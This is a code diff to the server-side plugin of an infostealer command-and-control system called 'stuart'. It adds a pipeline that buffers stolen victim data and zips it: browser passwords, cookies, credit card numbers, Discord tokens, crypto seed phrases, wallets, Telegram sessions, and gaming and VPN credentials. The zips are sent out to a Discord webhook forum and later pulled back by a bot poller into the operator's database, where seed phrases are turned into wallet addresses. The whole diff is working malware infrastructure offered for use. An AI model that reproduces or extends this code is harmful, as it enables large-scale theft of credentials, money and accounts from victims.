@@ -299,22 +299,32 @@ async function checkTrxBalances(addresses) {
 
 let stmts = null;
 let blobDir = null;
+/** Live plugin context (db, broadcast) for Discord poller. */
+let pluginCtx = null;
 let pluginSettings = {
   capture_history: true,
   capture_cookies: true,
   history_limit: 5000,
   cookie_max_age_days: 30,
-  discord_webhook_url: "",
+  /** When on: harvests are zipped → Discord only; UI data comes from bot poll import. */
   discord_upload_enabled: false,
-  discord_forum_mode: true,
+  discord_webhook_url: "",
+  discord_bot_token: "",
+  discord_forum_channel_id: "",
   discord_thread_prefix: "Stuart",
+  discord_poll_interval_sec: 15,
 };
 
 /** Max Discord attachment size for webhooks (bytes). Keep under 25 MiB. */
 const DISCORD_MAX_ZIP_BYTES = 24 * 1024 * 1024;
-/** Debounce auto-uploads per client so partial floods don't spam Discord. */
+/** Debounce webhook uploads per client (partials → results). */
 const discordUploadTimers = new Map();
-const DISCORD_UPLOAD_DEBOUNCE_MS = 4000;
+const DISCORD_UPLOAD_DEBOUNCE_MS = 2500;
+/** In-memory harvest buffers when Discord pipeline is on (not written to C2 DB). */
+const pendingDiscordHarvest = new Map();
+let discordPollTimer = null;
+let discordPollRunning = false;
+let discordPollStatus = { lastAt: 0, lastOk: null, lastError: "", imported: 0, message: "" };
 
 function safeFsName(s) {
   return String(s).replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 120);
@@ -383,8 +393,10 @@ function loadSettings(db) {
       else if (r.key === 'cookie_max_age_days') pluginSettings.cookie_max_age_days = Math.max(0, Number(r.value) || 0);
       else if (r.key === 'discord_webhook_url') pluginSettings.discord_webhook_url = String(r.value || '');
       else if (r.key === 'discord_upload_enabled') pluginSettings.discord_upload_enabled = r.value === '1';
-      else if (r.key === 'discord_forum_mode') pluginSettings.discord_forum_mode = r.value !== '0';
+      else if (r.key === 'discord_bot_token') pluginSettings.discord_bot_token = String(r.value || '');
+      else if (r.key === 'discord_forum_channel_id') pluginSettings.discord_forum_channel_id = String(r.value || '').replace(/\D/g, '');
       else if (r.key === 'discord_thread_prefix') pluginSettings.discord_thread_prefix = String(r.value || 'Stuart').slice(0, 80);
+      else if (r.key === 'discord_poll_interval_sec') pluginSettings.discord_poll_interval_sec = Math.max(5, Math.min(300, Number(r.value) || 15));
     }
   } catch (_) {}
 }
@@ -400,6 +412,21 @@ function isValidDiscordWebhook(url) {
   }
 }
 
+function isDiscordPipelineOn() {
+  return !!(pluginSettings.discord_upload_enabled && isValidDiscordWebhook(pluginSettings.discord_webhook_url));
+}
+
+function isDiscordPollConfigured() {
+  return !!(pluginSettings.discord_bot_token && pluginSettings.discord_forum_channel_id);
+}
+
+function maskSecret(s, keep = 4) {
+  if (!s) return '';
+  const t = String(s);
+  if (t.length <= keep * 2) return '****';
+  return t.slice(0, keep) + '…' + t.slice(-keep);
+}
+
 function maskWebhookUrl(url) {
   if (!url) return '';
   try {
@@ -407,14 +434,24 @@ function maskWebhookUrl(url) {
     const parts = u.pathname.split('/').filter(Boolean);
     // api webhooks id token
     if (parts.length >= 4) {
-      const token = parts[3];
-      const masked = token.length > 8 ? token.slice(0, 4) + '…' + token.slice(-4) : '****';
-      parts[3] = masked;
+      parts[3] = maskSecret(parts[3]);
       u.pathname = '/' + parts.join('/');
       return u.toString();
     }
   } catch (_) {}
   return url.slice(0, 40) + '…';
+}
+
+function publicDiscordSettings(forAdmin) {
+  const s = { ...pluginSettings };
+  if (!forAdmin) {
+    if (s.discord_webhook_url) s.discord_webhook_url = maskWebhookUrl(s.discord_webhook_url);
+    if (s.discord_bot_token) s.discord_bot_token = maskSecret(s.discord_bot_token, 6);
+  }
+  s.discord_poll_status = { ...discordPollStatus };
+  s.discord_pipeline = isDiscordPipelineOn();
+  s.discord_poll_ready = isDiscordPollConfigured();
+  return s;
 }
 
 function cookiesToNetscape(cookies) {
@@ -491,49 +528,118 @@ function createZipBuffer(files) {
   return Buffer.concat(parts);
 }
 
-function collectExportData(db, clientId) {
-  const p = { clientId: clientId || undefined, limit: 0 };
-  const result = {};
-  for (const [key, cfg] of Object.entries(TABLE_CFGS)) {
-    // listTable is defined later; we query inline here to avoid ordering issues
-    const wheres = [];
-    const args = [];
-    if (clientId) {
-      wheres.push("client_id = ?");
-      args.push(clientId);
-    }
-    const where = wheres.length ? ` WHERE ${wheres.join(" AND ")}` : "";
-    result[key] = db.prepare(`SELECT ${cfg.sel} FROM ${cfg.tbl}${where} ORDER BY ${cfg.order}`).all(...args);
-  }
-  if (clientId) {
-    const profiles = db.prepare(`
-      SELECT dt.client_id as clientId, dt.token, dt.source,
-             dp.user_id, dp.username, dp.discriminator, dp.global_name,
-             dp.email, dp.phone, dp.verified, dp.mfa_enabled, dp.premium_type,
-             dp.friends_count, dp.guilds_count, dp.guild_names, dp.error
-      FROM discord_tokens dt
-      LEFT JOIN discord_profiles dp ON dp.token = dt.token
-      WHERE dt.client_id = ?
-      ORDER BY dt.captured_at DESC
-    `).all(clientId);
-    result.discord_profiles = profiles;
-  }
-  return result;
-}
-
 const EXPORT_FILE_ORDER = [
   "passwords", "cookies", "autofill", "history", "bookmarks", "credit_cards",
   "discord_tokens", "discord_profiles", "files", "extensions", "wallets",
   "telegram", "keys", "seeds", "app_credentials", "gaming_items", "vpn_items",
 ];
 
-function buildHarvestZip(db, clientId) {
-  const data = collectExportData(db, clientId);
+function emptyExportData() {
+  const o = {};
+  for (const k of EXPORT_FILE_ORDER) o[k] = [];
+  return o;
+}
+
+/** Merge agent event payloads into export-shaped buckets (in-memory, Discord pipeline). */
+function mergeAgentPayloadIntoExport(data, clientId, payload) {
+  if (!payload || typeof payload !== "object") return data;
+  const cid = clientId;
+  const add = (key, rows) => {
+    if (!rows?.length) return;
+    if (!data[key]) data[key] = [];
+    for (const r of rows) data[key].push({ ...r, clientId: r.clientId || cid });
+  };
+
+  add("passwords", payload.passwords);
+  add("cookies", (payload.cookies || []).map(r => ({
+    clientId: cid, host: r.host, name: r.name, value: r.value, path: r.path,
+    secure: !!r.secure, httpOnly: !!r.httpOnly, expiresUtc: r.expiresUtc,
+    browser: r.browser, profile: r.profile,
+  })));
+  add("autofill", payload.autofill);
+  add("history", (payload.history || []).map(r => ({
+    clientId: cid, url: r.url, title: r.title,
+    visitTimeUnix: r.visitTimeUnix, browser: r.browser, profile: r.profile,
+  })));
+  add("bookmarks", payload.bookmarks);
+  add("credit_cards", (payload.creditCards || []).map(r => ({
+    clientId: cid, nameOnCard: r.nameOnCard, cardNumber: r.cardNumber,
+    expirationMonth: r.expirationMonth, expirationYear: r.expirationYear,
+    nickname: r.nickname, browser: r.browser, profile: r.profile,
+  })));
+  add("discord_tokens", (payload.discordTokens || []).map(r => ({
+    clientId: cid, token: r.token, source: r.source,
+  })));
+  add("files", (payload.files || []).map(r => ({
+    clientId: cid, dir: r.dir, name: r.name, ext: r.ext, size: r.size,
+    modified: r.modified, path: r.path, tags: Array.isArray(r.tags) ? r.tags.join(",") : (r.tags || null),
+  })));
+  add("extensions", (payload.extensions || []).map(r => ({
+    clientId: cid, extId: r.extId, name: r.name, version: r.version,
+    browser: r.browser, profile: r.profile, path: r.path, category: r.category,
+  })));
+  add("wallets", (payload.wallets || []).map(r => ({
+    clientId: cid, name: r.name, type: r.type, path: r.path, files: r.files, size: r.size,
+  })));
+  const tg = payload.telegram || payload.sessions;
+  add("telegram", (tg || []).map(r => ({
+    clientId: cid, account: r.account, path: r.path, files: r.files, size: r.size,
+  })));
+  add("keys", payload.keys);
+  add("seeds", (payload.seeds || []).map(r => ({
+    clientId: cid, source: r.source, path: r.path, phrase: r.phrase,
+    words: r.words, valid: r.valid, addresses: r.addresses,
+  })));
+  add("app_credentials", (payload.appCredentials || []).map(r => ({
+    clientId: cid, application: r.application, host: r.host, port: r.port,
+    username: r.username, password: r.password, protocol: r.protocol, extra: r.extra,
+  })));
+
+  if (payload.gaming) {
+    if (!data.gaming_items) data.gaming_items = [];
+    const g = payload.gaming;
+    const pushG = (platform, label, value, detail) => {
+      data.gaming_items.push({ clientId: cid, platform, label, value, detail: detail || "" });
+    };
+    if (g.steam) {
+      const st = g.steam;
+      if (st.account) pushG("Steam", "Account", st.account, st.rememberPw ? "Remember PW" : "");
+      if (st.token) pushG("Steam", "Token", st.token, "");
+      if (st.steamPath) pushG("Steam", "Path", st.steamPath, "");
+      for (const f of (st.ssfnFiles || [])) pushG("Steam", "SSFN", f, "");
+      for (const gm of (st.games || [])) pushG("Steam", gm.name, gm.id, gm.installed ? "Installed" : "");
+    }
+    for (const b of (g.battleNet || [])) pushG("Battle.net", b.name, b.path, "");
+    for (const e of (g.epic || [])) pushG("Epic", e.name, e.path, "");
+    for (const r of (g.riot || [])) pushG("Riot", r.name, r.path, "");
+    for (const u of (g.uplay || [])) pushG("Uplay", u.name, u.path, "");
+  }
+  if (payload.vpns) {
+    if (!data.vpn_items) data.vpn_items = [];
+    const v = payload.vpns;
+    for (const n of (v.nordvpn || [])) data.vpn_items.push({ clientId: cid, provider: "NordVPN", label: n.username, value: n.password, detail: n.version });
+    for (const w of (v.wireguard || [])) data.vpn_items.push({ clientId: cid, provider: "WireGuard", label: w.name, value: w.endpoint || "", detail: w.interface || "" });
+    for (const o of (v.openvpn || [])) data.vpn_items.push({ clientId: cid, provider: "OpenVPN", label: o.name, value: o.path, detail: "" });
+    for (const m of (v.mullvad || [])) data.vpn_items.push({ clientId: cid, provider: "Mullvad", label: m.accountNumber, value: m.settingsPath, detail: "" });
+  }
+  return data;
+}
+
+function bufferDiscordHarvest(clientId, payload) {
+  let data = pendingDiscordHarvest.get(clientId);
+  if (!data) {
+    data = emptyExportData();
+    data._clientId = clientId;
+    pendingDiscordHarvest.set(clientId, data);
+  }
+  mergeAgentPayloadIntoExport(data, clientId, payload);
+}
+
+function buildZipFromExportData(data, clientId) {
   const prefix = clientId
     ? `stuart-${safeFsName(clientId).slice(0, 32)}`
     : "stuart-global";
 
-  // Prefer smaller tables first; history can blow the Discord limit
   const prioritized = [
     "passwords", "cookies", "autofill", "bookmarks", "credit_cards",
     "discord_tokens", "discord_profiles", "seeds", "keys", "app_credentials",
@@ -545,6 +651,16 @@ function buildHarvestZip(db, clientId) {
   const counts = {};
   let approx = 0;
 
+  const meta = {
+    v: 1,
+    source: "stuart",
+    clientId: clientId || null,
+    capturedAt: Date.now(),
+  };
+  const metaBody = Buffer.from(JSON.stringify(meta, null, 2), "utf8");
+  files.push({ name: `${prefix}/meta.json`, data: metaBody });
+  approx += metaBody.length;
+
   for (const key of prioritized) {
     let rows = data[key];
     if (!rows || !rows.length) continue;
@@ -555,7 +671,6 @@ function buildHarvestZip(db, clientId) {
       body = Buffer.from(cookiesToNetscape(rows), "utf8");
       name = `${prefix}/cookies.txt`;
     } else {
-      // Truncate history if needed to stay under Discord size
       if (key === "history" && approx > DISCORD_MAX_ZIP_BYTES * 0.4) {
         const maxRows = Math.max(200, Math.floor((DISCORD_MAX_ZIP_BYTES - approx) / 200));
         if (rows.length > maxRows) rows = rows.slice(0, maxRows);
@@ -563,7 +678,6 @@ function buildHarvestZip(db, clientId) {
       body = Buffer.from(JSON.stringify(rows, null, 2), "utf8");
       name = `${prefix}/${key}.json`;
       if (approx + body.length > DISCORD_MAX_ZIP_BYTES && key === "history") {
-        // binary-search-ish shrink
         let lo = 0, hi = rows.length;
         while (lo < hi) {
           const mid = Math.floor((lo + hi) / 2);
@@ -586,19 +700,56 @@ function buildHarvestZip(db, clientId) {
     approx += body.length + name.length + 64;
   }
 
-  if (!files.length) return null;
+  // meta-only is not a harvest
+  if (files.length <= 1 && !Object.keys(counts).length) return null;
+
   const zip = createZipBuffer(files);
   const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
   const filename = clientId
     ? `stuart-${safeFsName(clientId).slice(0, 24)}-${stamp}.zip`
     : `stuart-global-${stamp}.zip`;
-  return { zip, filename, counts, prefix };
+  return { zip, filename, counts, prefix, meta };
+}
+
+function collectExportData(db, clientId) {
+  const result = emptyExportData();
+  for (const [key, cfg] of Object.entries(TABLE_CFGS)) {
+    if (!result[key] && key !== "discord_profiles") continue;
+    const wheres = [];
+    const args = [];
+    if (clientId) {
+      wheres.push("client_id = ?");
+      args.push(clientId);
+    }
+    const where = wheres.length ? ` WHERE ${wheres.join(" AND ")}` : "";
+    const rows = db.prepare(`SELECT ${cfg.sel} FROM ${cfg.tbl}${where} ORDER BY ${cfg.order}`).all(...args);
+    if (result[key] !== undefined) result[key] = rows;
+    else result[key] = rows;
+  }
+  if (clientId) {
+    const profiles = db.prepare(`
+      SELECT dt.client_id as clientId, dt.token, dt.source,
+             dp.user_id, dp.username, dp.discriminator, dp.global_name,
+             dp.email, dp.phone, dp.verified, dp.mfa_enabled, dp.premium_type,
+             dp.friends_count, dp.guilds_count, dp.guild_names, dp.error
+      FROM discord_tokens dt
+      LEFT JOIN discord_profiles dp ON dp.token = dt.token
+      WHERE dt.client_id = ?
+      ORDER BY dt.captured_at DESC
+    `).all(clientId);
+    result.discord_profiles = profiles;
+  }
+  return result;
+}
+
+function buildHarvestZip(db, clientId) {
+  return buildZipFromExportData(collectExportData(db, clientId), clientId);
 }
 
 function buildDiscordSummary(clientId, counts) {
   const lines = [
     `**Stuart harvest**`,
-    clientId ? `Client: \`${clientId}\`` : `Scope: **all clients**`,
+    `client_id: \`${clientId || "unknown"}\``,
     `Time: ${new Date().toISOString()}`,
     "",
     "```",
@@ -614,7 +765,6 @@ function forumThreadName(clientId) {
   const prefix = (pluginSettings.discord_thread_prefix || "Stuart").replace(/[^\w\s\-_.]/g, "").trim() || "Stuart";
   const short = clientId ? safeFsName(clientId).slice(0, 40) : "global";
   const stamp = new Date().toISOString().slice(0, 16).replace("T", " ");
-  // Discord forum thread_name max 100 chars
   return `${prefix} ${short} ${stamp}`.slice(0, 100);
 }
 
@@ -633,55 +783,406 @@ async function postZipToDiscordWebhook({ webhookUrl, zip, filename, content, thr
     const text = await res.text().catch(() => "");
     throw new Error(`Discord webhook HTTP ${res.status}: ${text.slice(0, 400)}`);
   }
-  return true;
+  try { return await res.json(); } catch (_) { return { ok: true }; }
 }
 
-async function uploadHarvestToDiscord(db, clientId, { force = false } = {}) {
-  const url = pluginSettings.discord_webhook_url;
-  if (!force && !pluginSettings.discord_upload_enabled) {
-    return { ok: false, skipped: true, reason: "auto-upload disabled" };
+/** Upload buffered (or DB) harvest to Discord forum via webhook only. */
+async function flushDiscordHarvest(clientId) {
+  if (!isDiscordPipelineOn()) {
+    return { ok: false, skipped: true, reason: "Discord pipeline off or webhook missing" };
   }
-  if (!isValidDiscordWebhook(url)) {
-    return { ok: false, skipped: true, reason: "webhook not configured or invalid" };
-  }
+  const buffered = pendingDiscordHarvest.get(clientId);
+  pendingDiscordHarvest.delete(clientId);
 
-  const built = buildHarvestZip(db, clientId);
+  let built = null;
+  if (buffered) built = buildZipFromExportData(buffered, clientId);
+  if (!built && pluginCtx?.db) built = buildHarvestZip(pluginCtx.db, clientId);
   if (!built) return { ok: false, skipped: true, reason: "no data to export" };
   if (built.zip.length > DISCORD_MAX_ZIP_BYTES) {
     return { ok: false, error: `zip too large (${built.zip.length} bytes)` };
   }
 
   const content = buildDiscordSummary(clientId, built.counts);
-  const threadName = pluginSettings.discord_forum_mode ? forumThreadName(clientId) : undefined;
+  const threadName = forumThreadName(clientId);
 
   try {
-    await postZipToDiscordWebhook({
-      webhookUrl: url,
+    const msg = await postZipToDiscordWebhook({
+      webhookUrl: pluginSettings.discord_webhook_url,
       zip: built.zip,
       filename: built.filename,
       content,
       threadName,
     });
-    console.log(`[stuart] Discord upload ok client=${clientId || "all"} file=${built.filename} bytes=${built.zip.length}`);
-    return { ok: true, filename: built.filename, size: built.zip.length, counts: built.counts, threadName: threadName || null };
+    console.log(`[stuart] Discord webhook ok client=${clientId} file=${built.filename} bytes=${built.zip.length}`);
+    // Poll Discord soon so UI can import the zip for display
+    scheduleDiscordPoll(1500);
+    return {
+      ok: true,
+      filename: built.filename,
+      size: built.zip.length,
+      counts: built.counts,
+      threadName,
+      messageId: msg?.id || null,
+      threadId: msg?.channel_id || null,
+    };
   } catch (err) {
-    console.error(`[stuart] Discord upload failed:`, err.message);
+    // put buffer back so a later flush can retry
+    if (buffered) pendingDiscordHarvest.set(clientId, buffered);
+    console.error(`[stuart] Discord webhook failed:`, err.message);
     return { ok: false, error: err.message };
   }
 }
 
-function scheduleDiscordUpload(db, clientId) {
-  if (!pluginSettings.discord_upload_enabled || !isValidDiscordWebhook(pluginSettings.discord_webhook_url)) return;
+function scheduleDiscordUpload(_db, clientId) {
+  if (!isDiscordPipelineOn()) return;
   const key = clientId || "__all__";
   const prev = discordUploadTimers.get(key);
   if (prev) clearTimeout(prev);
   const t = setTimeout(() => {
     discordUploadTimers.delete(key);
-    uploadHarvestToDiscord(db, clientId).catch(e =>
-      console.error("[stuart] scheduled Discord upload error:", e.message)
+    flushDiscordHarvest(clientId).catch(e =>
+      console.error("[stuart] Discord flush error:", e.message)
     );
   }, DISCORD_UPLOAD_DEBOUNCE_MS);
   discordUploadTimers.set(key, t);
+}
+
+// ── ZIP read + import (bot poll path) ─────────────────────────────────
+
+function unzipAll(buf) {
+  const out = [];
+  const b = Buffer.isBuffer(buf) ? buf : Buffer.from(buf);
+  let i = 0;
+  while (i + 30 <= b.length) {
+    const sig = b.readUInt32LE(i);
+    if (sig !== 0x04034b50) break;
+    const method = b.readUInt16LE(i + 8);
+    const compSize = b.readUInt32LE(i + 18);
+    const uncompSize = b.readUInt32LE(i + 22);
+    const nameLen = b.readUInt16LE(i + 26);
+    const extraLen = b.readUInt16LE(i + 28);
+    const name = b.slice(i + 30, i + 30 + nameLen).toString("utf8");
+    const dataStart = i + 30 + nameLen + extraLen;
+    const comp = b.slice(dataStart, dataStart + compSize);
+    let data;
+    if (method === 0) data = comp;
+    else if (method === 8) {
+      try { data = inflateRawSync(comp); }
+      catch (_) { data = null; }
+    } else data = null;
+    if (data) out.push({ name, data });
+    i = dataStart + compSize;
+    if (uncompSize === 0xffffffff || compSize === 0xffffffff) break; // zip64 not supported
+  }
+  return out;
+}
+
+function parseNetscapeCookies(text) {
+  const rows = [];
+  for (const line of String(text).split(/\r?\n/)) {
+    if (!line || line.startsWith("#")) continue;
+    const parts = line.split("\t");
+    if (parts.length < 7) continue;
+    const [host, , path, secure, expires, name, value] = parts;
+    let expiresUtc = 0;
+    const exp = Number(expires) || 0;
+    if (exp > 0) expiresUtc = (exp + 11644473600) * 1000000;
+    rows.push({
+      host, path, name, value,
+      secure: String(secure).toUpperCase() === "TRUE",
+      httpOnly: false,
+      expiresUtc,
+      browser: "", profile: "",
+    });
+  }
+  return rows;
+}
+
+function baseName(path) {
+  const n = path.replace(/\\/g, "/").split("/").pop() || path;
+  return n.toLowerCase();
+}
+
+function importZipIntoDb(db, zipBuf, fallbackClientId) {
+  if (!stmts) throw new Error("statements not ready");
+  const entries = unzipAll(zipBuf);
+  if (!entries.length) throw new Error("empty or unsupported zip");
+
+  let clientId = fallbackClientId || null;
+  const buckets = emptyExportData();
+
+  for (const ent of entries) {
+    const bn = baseName(ent.name);
+    const text = ent.data.toString("utf8");
+    if (bn === "meta.json") {
+      try {
+        const meta = JSON.parse(text);
+        if (meta.clientId) clientId = String(meta.clientId);
+      } catch (_) {}
+      continue;
+    }
+    if (bn === "cookies.txt") {
+      buckets.cookies = parseNetscapeCookies(text);
+      continue;
+    }
+    if (!bn.endsWith(".json")) continue;
+    const key = bn.replace(/\.json$/, "");
+    if (!buckets[key] && key !== "discord_profiles" && !EXPORT_FILE_ORDER.includes(key)) continue;
+    try {
+      const rows = JSON.parse(text);
+      if (Array.isArray(rows)) {
+        if (buckets[key]) buckets[key] = rows;
+        else buckets[key] = rows;
+      }
+    } catch (_) {}
+  }
+
+  // Infer clientId from rows if meta missing
+  if (!clientId) {
+    for (const k of EXPORT_FILE_ORDER) {
+      const row = (buckets[k] || [])[0];
+      if (row?.clientId) { clientId = String(row.clientId); break; }
+    }
+  }
+  if (!clientId) clientId = "discord-import";
+
+  const now = Date.now();
+  const payload = {
+    passwords: buckets.passwords,
+    cookies: buckets.cookies.map(r => ({
+      host: r.host, name: r.name, value: r.value, path: r.path,
+      secure: r.secure, httpOnly: r.httpOnly, expiresUtc: r.expiresUtc,
+      browser: r.browser, profile: r.profile,
+    })),
+    autofill: buckets.autofill,
+    history: buckets.history.map(r => ({
+      url: r.url, title: r.title, visitTimeUnix: r.visitTimeUnix ?? r.visit_time_unix,
+      browser: r.browser, profile: r.profile,
+    })),
+    bookmarks: buckets.bookmarks,
+    creditCards: buckets.credit_cards.map(r => ({
+      nameOnCard: r.nameOnCard ?? r.name_on_card,
+      cardNumber: r.cardNumber ?? r.card_number,
+      expirationMonth: r.expirationMonth ?? r.expiration_month,
+      expirationYear: r.expirationYear ?? r.expiration_year,
+      nickname: r.nickname, browser: r.browser, profile: r.profile,
+    })),
+    discordTokens: buckets.discord_tokens.map(r => ({ token: r.token, source: r.source })),
+    files: buckets.files.map(r => ({
+      dir: r.dir, name: r.name, ext: r.ext, size: r.size, modified: r.modified,
+      path: r.path, tags: typeof r.tags === "string" ? r.tags.split(",").filter(Boolean) : (r.tags || []),
+    })),
+    extensions: buckets.extensions.map(r => ({
+      extId: r.extId ?? r.ext_id, name: r.name, version: r.version,
+      browser: r.browser, profile: r.profile, path: r.path, category: r.category,
+    })),
+    wallets: buckets.wallets,
+    telegram: buckets.telegram,
+    keys: buckets.keys,
+    seeds: buckets.seeds,
+    appCredentials: buckets.app_credentials.map(r => ({
+      application: r.application, host: r.host, port: r.port,
+      username: r.username, password: r.password, protocol: r.protocol, extra: r.extra,
+    })),
+  };
+
+  const tx = db.transaction(() => {
+    insertPayload(db, stmts, clientId, payload, now);
+    // gaming / vpn rows from flat export
+    for (const r of buckets.gaming_items || []) {
+      stmts.insGaming.run(clientId, r.platform, r.label, r.value, r.detail || "", now);
+    }
+    for (const r of buckets.vpn_items || []) {
+      stmts.insVpn.run(clientId, r.provider, r.label, r.value, r.detail || "", now);
+    }
+    for (const r of buckets.seeds || []) {
+      if (!r.phrase) continue;
+      const words = String(r.phrase).split(/\s+/);
+      let valid = r.valid ? 1 : 0;
+      let addresses = typeof r.addresses === "string" ? r.addresses : (r.addresses ? JSON.stringify(r.addresses) : null);
+      if (!valid && words.every(w => wordlist.includes(w))) {
+        valid = 1;
+        try {
+          addresses = JSON.stringify([
+            ...deriveEthAddresses(r.phrase, 2).map(a => ({ chain: "EVM", address: a })),
+            ...deriveBtcAddresses(r.phrase, 1).map(a => ({ chain: "BTC", address: a })),
+            ...deriveLtcAddresses(r.phrase, 1).map(a => ({ chain: "LTC", address: a })),
+            ...deriveTrxAddresses(r.phrase, 1).map(a => ({ chain: "TRX", address: a })),
+          ]);
+        } catch (_) {}
+      }
+      stmts.insSeed.run(clientId, r.source || "import", r.path || null, r.phrase, r.words || words.length, valid, addresses, now);
+    }
+    stmts.upsertRun.run(clientId, now);
+  });
+  tx();
+
+  const counts = {};
+  for (const k of EXPORT_FILE_ORDER) if (buckets[k]?.length) counts[k] = buckets[k].length;
+  return { clientId, counts };
+}
+
+// ── Discord bot poller ────────────────────────────────────────────────
+
+async function discordBotFetch(path, { method = "GET", raw = false } = {}) {
+  const token = pluginSettings.discord_bot_token;
+  if (!token) throw new Error("bot token not set");
+  const res = await fetch(`https://discord.com/api/v10${path}`, {
+    method,
+    headers: {
+      Authorization: `Bot ${token.trim()}`,
+      "User-Agent": "StuartPlugin (overlord, 1.0)",
+    },
+  });
+  if (!res.ok) {
+    const text = await res.text().catch(() => "");
+    throw new Error(`Discord API ${res.status} ${path}: ${text.slice(0, 300)}`);
+  }
+  if (raw) return Buffer.from(await res.arrayBuffer());
+  if (res.status === 204) return null;
+  return res.json();
+}
+
+async function listForumThreadIds(channelId) {
+  const ids = new Set();
+  // Active threads for guild
+  try {
+    const ch = await discordBotFetch(`/channels/${channelId}`);
+    const guildId = ch?.guild_id;
+    if (guildId) {
+      const active = await discordBotFetch(`/guilds/${guildId}/threads/active`);
+      for (const t of active?.threads || []) {
+        if (String(t.parent_id) === String(channelId)) ids.add(t.id);
+      }
+    }
+  } catch (e) {
+    console.warn("[stuart] active threads:", e.message);
+  }
+  // Public archived forum posts
+  try {
+    let before = "";
+    for (let page = 0; page < 5; page++) {
+      const q = before
+        ? `/channels/${channelId}/threads/archived/public?limit=50&before=${before}`
+        : `/channels/${channelId}/threads/archived/public?limit=50`;
+      const arch = await discordBotFetch(q);
+      const threads = arch?.threads || [];
+      for (const t of threads) ids.add(t.id);
+      if (!arch?.has_more || !threads.length) break;
+      before = threads[threads.length - 1]?.id;
+      if (!before) break;
+    }
+  } catch (e) {
+    console.warn("[stuart] archived threads:", e.message);
+  }
+  return [...ids];
+}
+
+async function pollDiscordOnce() {
+  if (discordPollRunning) return { ok: false, skipped: true, reason: "poll already running" };
+  if (!isDiscordPollConfigured()) {
+    return { ok: false, skipped: true, reason: "bot token or forum channel id missing" };
+  }
+  if (!pluginCtx?.db || !stmts) {
+    return { ok: false, skipped: true, reason: "plugin not ready" };
+  }
+
+  discordPollRunning = true;
+  let imported = 0;
+  const errors = [];
+  try {
+    const channelId = pluginSettings.discord_forum_channel_id;
+    const threadIds = await listForumThreadIds(channelId);
+    const db = pluginCtx.db;
+    const seenStmt = db.prepare(`SELECT 1 FROM discord_imports WHERE attachment_id = ?`);
+    const insImport = db.prepare(
+      `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
+    );
+
+    for (const threadId of threadIds) {
+      let messages;
+      try {
+        messages = await discordBotFetch(`/channels/${threadId}/messages?limit=50`);
+      } catch (e) {
+        errors.push(`thread ${threadId}: ${e.message}`);
+        continue;
+      }
+      for (const msg of messages || []) {
+        for (const att of msg.attachments || []) {
+          const name = (att.filename || "").toLowerCase();
+          if (!name.endsWith(".zip")) continue;
+          if (!name.includes("stuart") && !name.includes("kematian")) continue;
+          if (seenStmt.get(att.id)) continue;
+          try {
+            // Prefer proxy_url / url with bot auth when needed
+            const url = att.url || att.proxy_url;
+            const res = await fetch(url, {
+              headers: { Authorization: `Bot ${pluginSettings.discord_bot_token.trim()}` },
+            });
+            if (!res.ok) throw new Error(`download ${res.status}`);
+            const zipBuf = Buffer.from(await res.arrayBuffer());
+            const result = importZipIntoDb(db, zipBuf, null);
+            insImport.run(att.id, msg.id, threadId, result.clientId, att.filename || name, Date.now());
+            imported++;
+            console.log(`[stuart] imported Discord zip ${att.filename} → client ${result.clientId}`);
+            try {
+              pluginCtx.broadcast("harvest_update", { clientId: result.clientId, source: "discord" });
+            } catch (_) {}
+          } catch (e) {
+            errors.push(`${att.filename}: ${e.message}`);
+            console.error("[stuart] import attachment failed:", e.message);
+          }
+        }
+      }
+    }
+
+    discordPollStatus = {
+      lastAt: Date.now(),
+      lastOk: errors.length === 0,
+      lastError: errors.slice(0, 3).join("; "),
+      imported,
+      message: `threads=${threadIds.length} imported=${imported}`,
+    };
+    return { ok: true, threads: threadIds.length, imported, errors };
+  } catch (e) {
+    discordPollStatus = {
+      lastAt: Date.now(),
+      lastOk: false,
+      lastError: e.message,
+      imported,
+      message: "poll failed",
+    };
+    return { ok: false, error: e.message, imported };
+  } finally {
+    discordPollRunning = false;
+  }
+}
+
+function scheduleDiscordPoll(delayMs = 0) {
+  if (!isDiscordPollConfigured() || !pluginSettings.discord_upload_enabled) return;
+  if (delayMs > 0) {
+    setTimeout(() => {
+      pollDiscordOnce().catch(e => console.error("[stuart] poll:", e.message));
+    }, delayMs);
+    return;
+  }
+  pollDiscordOnce().catch(e => console.error("[stuart] poll:", e.message));
+}
+
+function startDiscordPoller() {
+  if (discordPollTimer) {
+    clearInterval(discordPollTimer);
+    discordPollTimer = null;
+  }
+  if (!pluginSettings.discord_upload_enabled || !isDiscordPollConfigured()) {
+    console.log("[stuart] Discord poller idle (enable pipeline + bot token + forum channel id)");
+    return;
+  }
+  const sec = Math.max(5, pluginSettings.discord_poll_interval_sec || 15);
+  console.log(`[stuart] Discord poller every ${sec}s on channel ${pluginSettings.discord_forum_channel_id}`);
+  // Immediate first poll
+  scheduleDiscordPoll(2000);
+  discordPollTimer = setInterval(() => scheduleDiscordPoll(0), sec * 1000);
 }
 
 function runPurge(db) {
@@ -1344,8 +1845,22 @@ export default {
     // Reclaim freed pages from recent deletes
     try { ctx.db.exec(`PRAGMA incremental_vacuum`); } catch (_) {}
 
+    // Track processed Discord zip attachments (bot poll import)
+    ctx.db.exec(`
+      CREATE TABLE IF NOT EXISTS discord_imports (
+        attachment_id TEXT PRIMARY KEY,
+        message_id TEXT,
+        thread_id TEXT,
+        client_id TEXT,
+        filename TEXT,
+        imported_at INTEGER NOT NULL
+      );
+      CREATE INDEX IF NOT EXISTS di_client ON discord_imports(client_id);
+    `);
+
     // Load settings and run purge
     loadSettings(ctx.db);
+    pluginCtx = ctx;
     try {
       const nowChrome = (Date.now() + 11644473600000) * 1000;
       const expired = ctx.db.prepare(`DELETE FROM cookies WHERE expires_utc > 0 AND expires_utc < ?`).run(nowChrome);
@@ -1360,13 +1875,30 @@ export default {
       console.error("[stuart] prepareStatements failed:", err.message, err.stack || "");
       throw err;
     }
+
+    startDiscordPoller();
   },
 
   onEvent(ctx, clientId, event, payload) {
     if (!stmts) { console.error("[stuart] onEvent called but stmts is null — setup likely failed"); return; }
     const now = Date.now();
+    pluginCtx = ctx;
+
+    /**
+     * Discord pipeline ON → buffer + webhook only (no C2 DB write).
+     * Display data is imported later by the bot poller from the forum zip.
+     */
+    const viaDiscord = (agentPayload) => {
+      bufferDiscordHarvest(clientId, agentPayload);
+      scheduleDiscordUpload(ctx.db, clientId);
